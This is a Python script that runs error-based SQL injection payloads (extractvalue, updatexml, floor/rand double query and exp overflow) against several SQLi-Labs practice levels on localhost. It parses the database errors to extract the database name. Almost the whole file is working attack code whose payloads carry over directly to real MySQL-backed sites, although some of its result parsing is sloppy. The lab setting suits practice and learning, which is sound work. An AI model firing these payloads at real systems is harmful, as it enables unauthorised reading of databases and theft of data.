#!/usr/bin/env python3
import requests
from urllib.parse import quote
import re

# Test error-based injection across multiple levels
print("=== SQLi-Labs Error-based Injection Comprehensive Test ===\n")

test_cases = [
    ("Less-5", "Single Quote Double Query", "'"),
    ("Less-6", "Double Quote Double Query", '"'),
    ("Less-13", "POST + Single Quote+Paren Double Query", "')"),
    ("Less-14", "POST + Double Quote Double Query", '"'),
]

# Test function
def test_error_injection(less_num, name, quote_type):
    print(f"\n{'='*60}")
    print(f"Testing {less_num}: {name}")
    print(f"{'='*60}")

    base_url = f"http://localhost/sqli-labs/{less_num}/"

    # Construct different payloads
    payloads = {
        "extractvalue": f"1{quote_type} and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+",
        "updatexml": f"1{quote_type} and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+",
        "floor_rand": f"1{quote_type} and (select 1 from(select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)--+",
        "exp": f"1{quote_type} and exp(~(select * from(select database())a))--+",
    }

    success_count = 0

    for func_name, payload in payloads.items():
        print(f"\nTesting {func_name}():")
        try:
            if "POST" in name:
                # POST injection
                if "13" in less_num:
                    data = f"uname=admin{quote_type} and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+&passwd=test&submit=Submit"
                else:
                    data = f"uname=admin{quote_type} and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+&passwd=test&submit=Submit"
                r = requests.post(base_url, data={"uname": payload, "passwd": "test", "submit": "Submit"}, timeout=5)
            else:
                # GET injection
                r = requests.get(f"{base_url}?id={quote(payload)}", timeout=5)

            # Check various error messages
            if "XPATH syntax error" in r.text:
                xpath_match = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<\n]+)', r.text)
                if xpath_match:
                    print(f"  ✅ Success! Data: {xpath_match.group(1)}")
                    success_count += 1
                else:
                    print(f"  ✅ XPATH error triggered, but unable to extract data")
            elif "Duplicate entry" in r.text:
                dup_match = re.search(r"Duplicate entry '([^']+)'", r.text)
                if dup_match:
                    db_name = dup_match.group(1).replace('0', '').replace('1', '')
                    print(f"  ✅ Success! Data: {db_name}")
                    success_count += 1
            elif "DOUBLE value is out of range" in r.text or "exp" in r.text.lower():
                print(f"  ✅ exp() error triggered")
                success_count += 1
            elif "Fatal error" in r.text or "SQL syntax" in r.text:
                # Extract SQL error message
                error_match = re.search(r"SQL syntax.*?near '([^']+)'", r.text, re.DOTALL)
                if error_match:
                    print(f"  ⚠️  SQL syntax error: ...{error_match.group(1)[:100]}")
                else:
                    print(f"  ⚠️  Fatal error triggered")
            else:
                print(f"  ❌ No error triggered (Status code: {r.status_code}, Length: {len(r.text)})")

        except Exception as e:
            print(f"  ❌ Request failed: {e}")

    print(f"\n{less_num} success rate: {success_count}/4")
    return success_count

# Execute tests
total_success = 0
for less_num, name, quote_type in test_cases:
    total_success += test_error_injection(less_num, name, quote_type)

print(f"\n\n{'='*60}")
print(f"Overall test results: {total_success}/16")
print(f"{'='*60}")
